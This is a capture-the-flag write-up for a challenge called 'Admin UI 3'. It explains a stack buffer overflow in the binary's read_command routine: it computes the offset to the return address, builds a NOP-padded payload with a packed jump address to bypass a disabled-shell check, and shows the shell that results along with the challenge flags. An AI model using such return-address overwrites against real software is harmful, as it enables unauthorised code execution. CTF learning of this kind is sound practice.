# Admin UI 3

So by now we have 2 keys

1. `CTF{I_luv_buggy_sOFtware}`
2. `CTF{Two_PasSworDz_Better_th4n_1_k?`

Let's open the binary again and look deeper inside `secondary_login`. After the authentication it goes to a self made `command_line`.

The pseudo-code is simple:

```
while (True)
{
	read_command(buffer);
	if (buffer == "quit") -> quit
	if (buffer == "version") -> print "Version 0.3"
	if (buffer == "shell") 
	{
		if (shell_enabled) debug_shell() // Spoilers, it's a global variable that is FALSE, so no luck here
		else print "Security made us disable the shell, sorry!"
	}
	...
}
```

So, let's investigate `read_command`, maybe we can find something interesting there, there doesn't seem to be any limitation on size given as parameters.
Indeed! Looks like the function reads up to `\n`, so we can overrun the buffer and get to the juicy return address!

Looking at the stack positions, `buffer` is at `RBP-30` and the return address is at `RBP+8`, which means `56 bytes` of dummy data and other `8 bytes` of the replacement for the address, let it be the address after if (shell_enabled), to skip verification `0x41414349`
Let's construct our payload.

```
shell_addr = 0x41414349
payload = '\x90' * 56 + struct.pack('<Q', shell_addr)
```

Then just type `quit` to end the function aaaaaaaand _we got a shell_!

```
quit
$ ls
an0th3r_fl44444g_yo
flag
main
patchnotes
$ cat an0th3r_fl44444g_yo
CTF{c0d3ExEc?W411_pL4y3d}
[*] Got EOF while reading in interactive
```


